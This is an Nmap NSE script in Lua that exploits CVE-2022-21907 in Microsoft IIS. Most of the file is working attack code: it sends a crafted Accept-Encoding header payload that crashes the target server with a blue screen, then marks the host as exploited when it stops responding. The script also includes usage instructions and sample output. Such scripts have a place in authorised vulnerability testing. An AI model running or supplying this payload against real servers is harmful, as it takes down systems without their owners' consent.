description = [[
  The IIS Web Server contains a RCE vulnerability. This script
  exploits this vulnerability with a DOS attack (causes a Blue Screen).
]]

author = "Maurice LAMBERT <mauricelambert434@gmail.com>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"dos", "exploit", "intrusive", "vuln"}

---
-- @name
-- IIS DOS CVE-2022-21907 - Web Server Blue Screen
-- @author
-- Maurice LAMBERT <mauricelambert434@gmail.com>
-- @usage
-- nmap -p 80 --script dos_iis_2022_21907 <target>
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | dos_iis_2022_21907:
-- |   VULNERABLE:
-- |   IIS CVE-2022-21907 DOS
-- |   State: VULNERABLE (Exploitable)
-- |   IDs:  CVE:CVE-2022-21907
-- |           The IIS Web Server contains a RCE vulnerability. This script
-- |           exploits this vulnerability with a DOS attack
-- |           (causes a Blue Screen).
-- |
-- |   Disclosure date: 2022-01-11
-- |   References:
-- |     https://nvd.nist.gov/vuln/detail/CVE-2022-21907
-- |     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21907
-- |_    https://github.com/mauricelambert/CVE-2022-21907

local shortport = require "shortport"
local stdnse = require "stdnse"
local vulns = require "vulns"
local http = require "http"

portrule = shortport.http

action = function(host, port)
  local vuln = {
    title = "IIS CVE-2022-21907 DOS",
    state = vulns.STATE.NOT_VULN,
    IDS = { CVE = 'CVE-2022-21907' },
    description = [[
      The IIS Web Server contains a RCE vulnerability. This script
      exploits this vulnerability with a DOS attack
      (causes a Blue Screen).
    ]],
    references = {
       'https://nvd.nist.gov/vuln/detail/CVE-2022-21907',
       'https://github.com/mauricelambert/CVE-2022-21907',
     },
     dates = {
       disclosure = {year = '2022', month = '01', day = '11'},
     },
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  local headers = {}
  headers["Accept-Encoding"] = "AAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAA" ..
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&AA&**AAAAAAAAAAAAAAAAAAAA" ..
    "**A,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ..
    "AAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ..
    "AAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAA,****************************A" ..
    "AAAAA, *, ,"

  stdnse.debug2("Web service is up. Send payload...")
  local response = http.generic_request(
    host,
    port,
    "GET",
    "/",
    {
      timeout = 10,
      header = headers,
    }
  )

  if (response.status) then
    return report:make_output(vuln)
  else
    vuln.state = vulns.STATE.EXPLOIT -- UNKNOWN, LIKELY_VULN
    return report:make_output(vuln)
  end
end